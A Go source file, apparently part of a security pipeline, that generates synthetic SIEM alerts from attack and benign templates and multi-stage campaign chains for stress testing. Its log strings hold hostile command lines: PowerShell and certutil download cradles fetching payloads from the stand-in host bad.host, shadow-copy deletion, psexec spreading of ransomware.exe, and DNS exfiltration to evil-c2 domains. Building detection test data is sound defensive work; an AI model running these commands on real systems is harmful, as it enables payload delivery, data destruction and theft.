package main

import (
	"fmt"
	"math/rand"
	"strings"
)

// ============================================================
// ALERT FORGE — Scenario Templates & Mutation Engine
// Generates realistic SIEM alerts for pipeline stress testing.
// ============================================================

// AlertTemplate is a base alert scenario that can be mutated.
type AlertTemplate struct {
	TaskType string
	Severity string
	SIEMEvent map[string]interface{}
	RawLog   string
}

// ---------- IP & Username Generators ----------

func randomExternalIP() string {
	// Use documentation/test ranges plus common threat IPs
	prefixes := []string{"198.51.100", "203.0.113", "185.220.101", "45.33.32", "91.215.85"}
	prefix := prefixes[rand.Intn(len(prefixes))]
	return fmt.Sprintf("%s.%d", prefix, rand.Intn(254)+1)
}

func randomInternalIP() string {
	subnets := []string{"10.0.20", "10.0.30", "10.0.40", "10.0.50", "10.0.60", "192.168.1", "172.16.0"}
	subnet := subnets[rand.Intn(len(subnets))]
	return fmt.Sprintf("%s.%d", subnet, rand.Intn(254)+1)
}

func randomUsername() string {
	users := []string{
		"root", "admin", "jsmith", "asmith", "jdoe", "svc_backup",
		"sql_svc", "web_admin", "compromised", "attacker_user",
		"exfil_user", "golden_attacker", "data_thief", "user2",
		"SYSTEM", "Administrator", "krbtgt", "backup_svc",
	}
	return users[rand.Intn(len(users))]
}

func typosquatDomain() string {
	bases := []string{
		"login-verify-account.com",
		"micr0soft-update.com",
		"g00gle-security.com",
		"amaz0n-verify.com",
		"app1e-id-check.com",
		"paypa1-secure.com",
		"0ffice365-auth.com",
		"dr0pbox-share.com",
	}
	return bases[rand.Intn(len(bases))]
}

func phishingSubject() string {
	subjects := []string{
		"URGENT verify your account immediately or suspended",
		"Your password expires today - action required",
		"Invoice #INV-2026-0413 attached - please review",
		"IT Security: Mandatory password reset required",
		"Shared document from CEO - confidential",
		"Wire transfer confirmation needed",
		"Account lockout notification - verify identity",
		"HR: Updated benefits enrollment - sign now",
	}
	return subjects[rand.Intn(len(subjects))]
}

func randomHostname() string {
	prefixes := []string{"WORKSTATION", "SERVER", "DC", "WEB", "DB", "APP", "FILE"}
	prefix := prefixes[rand.Intn(len(prefixes))]
	return fmt.Sprintf("%s-%02d", prefix, rand.Intn(99)+1)
}

func randomPort() int {
	ports := []int{443, 4444, 8080, 8443, 9001, 1337, 5555, 6666, 53, 80}
	return ports[rand.Intn(len(ports))]
}

func randomHash() string {
	chars := "0123456789abcdef"
	b := make([]byte, 64) // SHA-256 length
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

// ---------- Attack Scenarios (10 types) ----------

var attackScenarios = map[string]AlertTemplate{
	"brute_force": {
		TaskType: "brute_force",
		Severity: "high",
		RawLog:   "500 failed password attempts for {username} from {source_ip} in 10 minutes. Failed Failed Failed Failed Failed Failed Failed Failed Failed Failed",
		SIEMEvent: map[string]interface{}{
			"title":     "SSH Brute Force Attack",
			"rule_name": "BruteForce",
		},
	},
	"phishing": {
		TaskType: "phishing",
		Severity: "high",
		RawLog:   "From: alert@{domain} Subject: {subject}. Click here: https://{domain}/secure/login.php password credential",
		SIEMEvent: map[string]interface{}{
			"title":     "Phishing Email Detected",
			"rule_name": "PhishingDetection",
		},
	},
	"ransomware": {
		TaskType: "ransomware",
		Severity: "critical",
		RawLog:   "vssadmin delete shadows detected. wmic shadowcopy delete detected. Files with .locked extension found on {hostname}. README_DECRYPT.txt bitcoin payment ransom demanded.",
		SIEMEvent: map[string]interface{}{
			"title":     "Ransomware Activity",
			"rule_name": "Ransomware",
		},
	},
	"kerberoasting": {
		TaskType: "kerberoasting",
		Severity: "high",
		RawLog:   "EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc/db01.corp.local:1433 TargetUserName={username} ClientAddress={source_ip}",
		SIEMEvent: map[string]interface{}{
			"title":     "Kerberoasting Detected",
			"rule_name": "Kerberoasting",
		},
	},
	"dns_exfiltration": {
		TaskType: "dns_exfiltration",
		Severity: "high",
		RawLog:   "DNS TXT query: aGVsbG8gd29ybGQgZXhmaWx0cmF0aW9uIGRhdGE.evil-c2.xyz type=TXT queries=250 dns exfiltration high entropy tunnel nslookup {source_ip}",
		SIEMEvent: map[string]interface{}{
			"title":     "DNS Exfiltration",
			"rule_name": "DNSExfiltration",
			"domain":    "aGVsbG8gd29ybGQgZXhmaWx0cmF0aW9uIGRhdGE.evil-c2.xyz",
		},
	},
	"c2_communication": {
		TaskType: "c2_communication",
		Severity: "high",
		RawLog:   "beacon interval=60s stddev=1.2 connections=150 to xk7q9m2p.evil-c2.net:{port} c2 beacon callback implant",
		SIEMEvent: map[string]interface{}{
			"title":     "C2 Beacon Detected",
			"rule_name": "C2Detection",
		},
	},
	"data_exfiltration": {
		TaskType: "data_exfiltration",
		Severity: "high",
		RawLog:   "Transfer 2.5 GB to {dest_ip} external after.hours archive.rar compressed encrypted off-hours upload to dropbox",
		SIEMEvent: map[string]interface{}{
			"title":     "Data Exfiltration",
			"rule_name": "DataExfiltration",
		},
	},
	"lolbin_abuse": {
		TaskType: "lolbin_abuse",
		Severity: "high",
		RawLog:   "mshta.exe vbscript:Execute(CreateObject(Wscript.Shell).Run(malicious)) bitsadmin transfer download http://bad.host/stage2.bin",
		SIEMEvent: map[string]interface{}{
			"title":     "LOLBin Abuse - mshta",
			"rule_name": "LOLBinAbuse",
		},
	},
	"lateral_movement": {
		TaskType: "lateral_movement",
		Severity: "high",
		RawLog:   "psexec.exe \\\\{dest_ip} -u {username} cmd.exe pass-the-hash ntlm admin$ lateral remote wmic",
		SIEMEvent: map[string]interface{}{
			"title":     "Lateral Movement",
			"rule_name": "LateralMovement",
		},
	},
	"golden_ticket": {
		TaskType: "golden_ticket",
		Severity: "critical",
		RawLog:   "EventID=4768 TicketEncryptionType=0x17 ServiceName=krbtgt TargetUserName={username} ClientAddress={source_ip} Lifetime=8760h TicketOptions=0x50800000",
		SIEMEvent: map[string]interface{}{
			"title":     "Golden Ticket Attack",
			"rule_name": "GoldenTicket",
		},
	},
}

// ---------- Benign Scenarios (5 types) ----------

var benignScenarios = map[string]AlertTemplate{
	"password_change": {
		TaskType: "password_change",
		Severity: "info",
		RawLog:   "User {username} successfully changed password via self-service portal from {source_ip}",
		SIEMEvent: map[string]interface{}{
			"title":     "Password Changed",
			"rule_name": "PasswordChange",
		},
	},
	"windows_update": {
		TaskType: "windows_update",
		Severity: "info",
		RawLog:   "Windows Update KB5034441 installed successfully on {hostname}",
		SIEMEvent: map[string]interface{}{
			"title":     "Windows Update Applied",
			"rule_name": "WindowsUpdate",
		},
	},
	"health_check": {
		TaskType: "health_check",
		Severity: "info",
		RawLog:   "System health check passed. CPU 45 percent Memory 62 percent Disk 38 percent. All services normal.",
		SIEMEvent: map[string]interface{}{
			"title":     "Health Check OK",
			"rule_name": "HealthCheck",
		},
	},
	"scheduled_backup": {
		TaskType: "scheduled_backup",
		Severity: "info",
		RawLog:   "Nightly backup completed successfully. 150 GB backed up to tape. Next scheduled tomorrow.",
		SIEMEvent: map[string]interface{}{
			"title":     "Backup Completed",
			"rule_name": "ScheduledBackup",
		},
	},
	"user_login": {
		TaskType: "user_login",
		Severity: "info",
		RawLog:   "User {username} logged in successfully via RDP from {source_ip} at 09:00 UTC",
		SIEMEvent: map[string]interface{}{
			"title":     "User Login",
			"rule_name": "UserLogin",
		},
	},
}

// ---------- Campaign Definitions (3 multi-stage attack chains) ----------

// Campaign is a multi-stage attack chain.
type Campaign struct {
	Name  string
	Steps []AlertTemplate
}

var campaigns = []Campaign{
	{
		Name: "APT Intrusion Chain",
		Steps: []AlertTemplate{
			{
				TaskType: "phishing",
				Severity: "high",
				RawLog:   "From: hr@{domain} Subject: Updated benefits enrollment. Attachment: benefits_2026.xlsm macro enabled. Click here: https://{domain}/portal password credential",
				SIEMEvent: map[string]interface{}{
					"title": "Phishing Email - Initial Access", "rule_name": "PhishingDetection",
				},
			},
			{
				TaskType: "lolbin_abuse",
				Severity: "high",
				RawLog:   "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA download cradle IEX (New-Object Net.WebClient).DownloadString('http://bad.host/stage2.ps1')",
				SIEMEvent: map[string]interface{}{
					"title": "LOLBin - PowerShell Encoded Command", "rule_name": "LOLBinAbuse",
				},
			},
			{
				TaskType: "c2_communication",
				Severity: "high",
				RawLog:   "beacon interval=30s stddev=0.5 connections=80 to {dest_ip}:443 c2 beacon callback implant cobalt strike",
				SIEMEvent: map[string]interface{}{
					"title": "C2 Beacon Established", "rule_name": "C2Detection",
				},
			},
			{
				TaskType: "lateral_movement",
				Severity: "high",
				RawLog:   "wmic /node:{dest_ip} process call create cmd.exe pass-the-hash ntlm lateral remote",
				SIEMEvent: map[string]interface{}{
					"title": "WMI Lateral Movement", "rule_name": "LateralMovement",
				},
			},
			{
				TaskType: "data_exfiltration",
				Severity: "critical",
				RawLog:   "Transfer 5.2 GB to {dest_ip} external archive.7z compressed encrypted off-hours exfiltration staged data",
				SIEMEvent: map[string]interface{}{
					"title": "Data Exfiltration - Final Stage", "rule_name": "DataExfiltration",
				},
			},
		},
	},
	{
		Name: "Kerberos Privilege Escalation",
		Steps: []AlertTemplate{
			{
				TaskType: "brute_force",
				Severity: "high",
				RawLog:   "300 failed password attempts for {username} from {source_ip} in 5 minutes. Failed Failed Failed Failed Failed",
				SIEMEvent: map[string]interface{}{
					"title": "Brute Force - Initial Attempt", "rule_name": "BruteForce",
				},
			},
			{
				TaskType: "kerberoasting",
				Severity: "high",
				RawLog:   "EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc/db01.corp.local:1433 TargetUserName={username} ClientAddress={source_ip} SPN enumeration multiple",
				SIEMEvent: map[string]interface{}{
					"title": "Kerberoasting - SPN Enumeration", "rule_name": "Kerberoasting",
				},
			},
			{
				TaskType: "golden_ticket",
				Severity: "critical",
				RawLog:   "EventID=4768 TicketEncryptionType=0x17 ServiceName=krbtgt TargetUserName={username} ClientAddress={source_ip} Lifetime=8760h TicketOptions=0x50800000 forged TGT",
				SIEMEvent: map[string]interface{}{
					"title": "Golden Ticket - Forged TGT", "rule_name": "GoldenTicket",
				},
			},
		},
	},
	{
		Name: "Ransomware Kill Chain",
		Steps: []AlertTemplate{
			{
				TaskType: "phishing",
				Severity: "high",
				RawLog:   "From: invoice@{domain} Subject: Invoice #INV-2026-0413 attached. Attachment: invoice.docm macro enabled password credential",
				SIEMEvent: map[string]interface{}{
					"title": "Phishing - Ransomware Delivery", "rule_name": "PhishingDetection",
				},
			},
			{
				TaskType: "lolbin_abuse",
				Severity: "high",
				RawLog:   "certutil.exe -urlcache -split -f http://bad.host/payload.exe payload.exe bitsadmin transfer download",
				SIEMEvent: map[string]interface{}{
					"title": "LOLBin - Certutil Download", "rule_name": "LOLBinAbuse",
				},
			},
			{
				TaskType: "lateral_movement",
				Severity: "high",
				RawLog:   "psexec.exe \\\\{dest_ip} -u {username} -c ransomware.exe pass-the-hash ntlm admin$ lateral remote",
				SIEMEvent: map[string]interface{}{
					"title": "Lateral Movement - Ransomware Spread", "rule_name": "LateralMovement",
				},
			},
			{
				TaskType: "ransomware",
				Severity: "critical",
				RawLog:   "vssadmin delete shadows /all /quiet. wmic shadowcopy delete. Mass encryption detected: 15000 files renamed to .locked. README_DECRYPT.txt bitcoin payment ransom demanded.",
				SIEMEvent: map[string]interface{}{
					"title": "Ransomware - Encryption Active", "rule_name": "Ransomware",
				},
			},
		},
	},
}

// ---------- Alert Generation ----------

// generateAlert creates a complete alert payload from a template,
// filling in randomized values and adding the forge marker.
// alertIndex provides uniqueness so burst-generated alerts don't collide
// in the dedup layer (which hashes task_type + source_ip + raw_log).
func generateAlert(scenario AlertTemplate, forgeJobID string, alertIndex int) map[string]interface{} {
	// Deterministic unique source_ip derived from alert index.
	// Index 1 → 10.200.1.1, index 256 → 10.200.2.1, index 1000 → 10.200.4.232.
	// Third octet rotates every 254 alerts, second octet rotates every ~65k.
	srcIP := fmt.Sprintf("10.200.%d.%d",
		1+(alertIndex/254)%254,
		1+(alertIndex%254))
	dstIP := randomInternalIP()
	username := fmt.Sprintf("%s_%d", randomUsername(), alertIndex)
	hostname := randomHostname()
	domain := typosquatDomain()
	subject := phishingSubject()
	port := fmt.Sprintf("%d", randomPort())

	// Apply template substitutions to raw_log
	rawLog := scenario.RawLog
	rawLog = strings.ReplaceAll(rawLog, "{source_ip}", srcIP)
	rawLog = strings.ReplaceAll(rawLog, "{dest_ip}", dstIP)
	rawLog = strings.ReplaceAll(rawLog, "{username}", username)
	rawLog = strings.ReplaceAll(rawLog, "{hostname}", hostname)
	rawLog = strings.ReplaceAll(rawLog, "{domain}", domain)
	rawLog = strings.ReplaceAll(rawLog, "{subject}", subject)
	rawLog = strings.ReplaceAll(rawLog, "{port}", port)
	// Append unique forge marker so content hash differs even if somehow
	// task_type + source_ip collides. Format: "[forge:<jobID>:<index>]"
	rawLog = fmt.Sprintf("%s [forge:%s:%d]", rawLog, forgeJobID, alertIndex)

	// Build SIEM event
	siemEvent := make(map[string]interface{})
	for k, v := range scenario.SIEMEvent {
		siemEvent[k] = v
	}
	siemEvent["source_ip"] = srcIP
	siemEvent["username"] = username
	siemEvent["raw_log"] = rawLog

	if _, exists := siemEvent["destination_ip"]; !exists {
		// Add dest_ip for scenarios that use it
		if strings.Contains(scenario.RawLog, "{dest_ip}") {
			siemEvent["destination_ip"] = dstIP
		}
	}
	if _, exists := siemEvent["hostname"]; !exists {
		siemEvent["hostname"] = hostname
	}

	return map[string]interface{}{
		"task_type": scenario.TaskType,
		"input": map[string]interface{}{
			"prompt":       fmt.Sprintf("Forge: %s investigation", scenario.TaskType),
			"severity":     scenario.Severity,
			"siem_event":   siemEvent,
			"is_forge":     true,
			"forge_job_id": forgeJobID,
		},
	}
}

// novelMutation creates an unusual variant of a base template for Path C testing.
// Changes protocol, severity, adds extra fields, or uses uncommon task_type.
func novelMutation(base AlertTemplate) AlertTemplate {
	mutated := AlertTemplate{
		TaskType:  base.TaskType,
		Severity:  base.Severity,
		SIEMEvent: make(map[string]interface{}),
		RawLog:    base.RawLog,
	}
	for k, v := range base.SIEMEvent {
		mutated.SIEMEvent[k] = v
	}

	mutation := rand.Intn(5)
	switch mutation {
	case 0:
		// Change to uncommon task_type (forces Path C)
		novelTypes := []string{
			"unusual_network_traffic", "crypto_mining_detected",
			"rogue_dhcp_server", "arp_spoofing", "bgp_hijack",
			"firmware_tampering", "bios_rootkit", "usb_exfiltration",
		}
		mutated.TaskType = novelTypes[rand.Intn(len(novelTypes))]
		mutated.SIEMEvent["title"] = fmt.Sprintf("Novel: %s", mutated.TaskType)
	case 1:
		// Severity escalation
		mutated.Severity = "critical"
		mutated.RawLog = mutated.RawLog + " CRITICAL ESCALATION multiple indicators"
	case 2:
		// Add extra enrichment fields
		mutated.SIEMEvent["process_name"] = "powershell.exe"
		mutated.SIEMEvent["parent_process"] = "cmd.exe"
		mutated.SIEMEvent["command_line"] = "powershell -enc SQBFAFgAIAAo"
		mutated.SIEMEvent["file_hash"] = randomHash()
	case 3:
		// Protocol variation
		protocols := []string{"HTTPS", "DNS-over-HTTPS", "ICMP", "SSH", "RDP"}
		mutated.RawLog = fmt.Sprintf("[%s] %s", protocols[rand.Intn(len(protocols))], mutated.RawLog)
		mutated.SIEMEvent["protocol"] = protocols[rand.Intn(len(protocols))]
	case 4:
		// Multi-host variant
		mutated.RawLog = fmt.Sprintf("%s Additional targets: %s, %s, %s",
			mutated.RawLog, randomInternalIP(), randomInternalIP(), randomInternalIP())
		mutated.SIEMEvent["affected_hosts"] = 4
	}

	return mutated
}

// nextCampaignAlert returns the next step in a campaign chain.
// sharedIP keeps the attacker IP consistent across campaign steps.
func nextCampaignAlert(campaignIndex int, stepIndex int, sharedIP string) AlertTemplate {
	if campaignIndex < 0 || campaignIndex >= len(campaigns) {
		campaignIndex = 0
	}
	campaign := campaigns[campaignIndex]
	if stepIndex < 0 || stepIndex >= len(campaign.Steps) {
		stepIndex = stepIndex % len(campaign.Steps)
	}

	step := campaign.Steps[stepIndex]

	// Override source_ip with shared campaign IP for correlation
	step.SIEMEvent["source_ip"] = sharedIP

	return step
}
